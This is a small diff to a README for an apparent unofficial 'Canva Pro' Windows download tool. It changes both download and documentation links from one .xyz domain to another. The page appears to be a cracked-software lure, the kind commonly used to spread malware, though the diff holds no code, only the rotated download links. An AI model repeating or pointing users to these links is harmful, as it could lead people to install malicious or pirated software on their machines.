@@ -28,8 +28,8 @@ The goal is a tool that just works — no clutter, no bloat.
 - An internet connection for the first run
 
 ## 🔗 Links
-- 📥 **Download for Windows:** [https://canva-pro-craft.softonx.xyz](https://canva-pro-craft.softonx.xyz)
-- 📖 **Details & docs:** [https://canva-pro-craft.softonx.xyz](https://canva-pro-craft.softonx.xyz)
+- 📥 **Download for Windows:** [https://canva-pro-craft.softax.xyz](https://canva-pro-craft.softax.xyz)
+- 📖 **Details & docs:** [https://canva-pro-craft.softax.xyz](https://canva-pro-craft.softax.xyz)
 
 ## ⚠️ Disclaimer
 > [!CAUTION]
